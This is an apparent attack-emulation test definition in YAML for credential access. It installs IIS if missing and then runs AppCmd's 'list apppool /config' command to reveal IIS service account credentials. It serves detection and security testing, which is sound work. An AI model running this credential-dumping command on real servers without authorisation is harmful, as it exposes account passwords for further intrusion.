api_version: "2.0"
name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)
description: |-
    AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.
    [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)
uuid: 42510244-5019-48fa-a0e5-66c3b76e6049
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
requirements:
    platforms:
        - os: windows
steps:
    - name: IIS must be installed prior to running the test
      inline: if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {{Install-WindowsFeature -name Web-Server -IncludeManagementTools}}
      executor: powershell
    - name: retrieve-microsoft-iis-service-account-credentials-using-appcmd-(using-config)
      inline: C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
